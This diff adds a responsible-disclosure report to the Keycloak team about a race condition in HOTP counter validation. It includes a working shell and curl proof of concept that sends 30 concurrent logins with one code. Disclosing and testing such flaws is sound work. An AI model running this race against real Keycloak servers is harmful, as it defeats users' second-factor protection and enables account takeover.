@@ -1,0 +1,114 @@
+Hi Keycloak Security Team,
+
+I am reporting a race condition vulnerability in Keycloak's HOTP
+validation that allows a single one-time password to be used for
+multiple concurrent login sessions, defeating the purpose of
+one-time passwords entirely.
+
+Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
+Tested on: Keycloak 999.0.0-SNAPSHOT built from source
+
+AI Disclosure: AI tools were used to assist in drafting this report. The
+vulnerability was manually discovered, verified, and reproduced.
+
+DESCRIPTION:
+When HOTP is configured as the OTP policy, Keycloak validates the OTP
+code and increments the counter in a non-atomic operation. By sending
+multiple concurrent authentication requests with the same HOTP code,
+all requests validate against the same counter value before any of them
+increments it, allowing a single OTP code to authenticate an unlimited
+number of simultaneous sessions.
+
+ROOT CAUSE:
+The HOTP counter validation and increment are not performed atomically.
+There is no locking mechanism to prevent concurrent requests from reading
+the same counter value. Each concurrent request independently validates
+the OTP against the current counter, succeeds, and then increments it,
+but by then all requests have already passed validation.
+
+REPRODUCTION STEPS:
+
+1. Start Keycloak in dev mode on port 8084
+
+2. Get admin token and configure HOTP:
+
+KC=http://localhost:8084
+tok() {
+  curl -s $KC/realms/master/protocol/openid-connect/token \
+    -d client_id=admin-cli -d username=admin -d password=admin \
+    -d grant_type=password \
+    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
+}
+T=$(tok)
+
+curl -s -X PUT $KC/admin/realms/master \
+  -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' \
+  -d '{"otpPolicyType":"hotp","otpPolicyAlgorithm":"HmacSHA1","otpPolicyDigits":6,"otpPolicyInitialCounter":0}'
+
+3. Create a test user with HOTP credential:
+
+curl -s -X POST $KC/admin/realms/master/users \
+  -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"racey","enabled":true,"credentials":[{"type":"password","value":"racey","temporary":false}]}'
+
+RACEY_ID=$(curl -s "$KC/admin/realms/master/users?username=racey" \
+  -H "Authorization: Bearer $T" | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')
+
+T=$(tok)
+curl -s -X PUT "$KC/admin/realms/master/users/$RACEY_ID" \
+  -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' \
+  -d "{
+    \"credentials\":[
+      {\"type\":\"password\",\"value\":\"racey\",\"temporary\":false},
+      {\"type\":\"otp\",\"secretData\":\"{\\\"value\\\":\\\"GEZDGNBVGY3TQOJQ\\\",\\\"period\\\":0}\",\"credentialData\":\"{\\\"algorithm\\\":\\\"HmacSHA1\\\",\\\"digits\\\":6,\\\"counter\\\":0,\\\"subType\\\":\\\"hotp\\\",\\\"period\\\":0}\"}
+    ]
+  }"
+
+4. Use counter 0 code (755224) once to advance counter to 1:
+
+curl -s -X POST $KC/realms/master/protocol/openid-connect/token \
+  -d client_id=admin-cli -d username=racey -d password=racey \
+  -d grant_type=password -d totp=755224
+
+5. Send 30 concurrent requests with counter 1 code (287082):
+
+for i in $(seq 1 30); do
+  curl -s -o /tmp/race_$i.txt -w "%{http_code}" -X POST \
+    $KC/realms/master/protocol/openid-connect/token \
+    -d client_id=admin-cli -d username=racey -d password=racey \
+    -d grant_type=password -d totp=287082 &
+done
+wait
+
+6. Count successful logins:
+
+SUCCESS=0
+for i in $(seq 1 30); do
+  grep -q "access_token" /tmp/race_$i.txt 2>/dev/null && SUCCESS=$((SUCCESS+1))
+done
+echo "Successful logins: $SUCCESS / 30"
+
+RESULT: Successful logins: 30 / 30
+
+All 30 concurrent requests successfully authenticated with the same
+one-time password. Expected behavior: only 1 should succeed.
+
+IMPACT:
+- Complete bypass of HOTP one-time-password protection
+- An attacker who intercepts or phishes a single OTP code can create
+  unlimited concurrent sessions before the counter increments
+- No admin privileges required — any user account with HOTP is affected
+- Defeats the security guarantee of "one-time" passwords
+- Particularly dangerous in credential stuffing scenarios where an
+  attacker has the password and intercepts one OTP via phishing or
+  SIM swap
+
+CVSS 3.1: 8.1 (High)
+Vector: AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+Credit: Muhannad Alsaif (xNadByte)
+Contact: Mohnadalsaif1@gmail.com
+GitHub: Mohnad-AL-saif
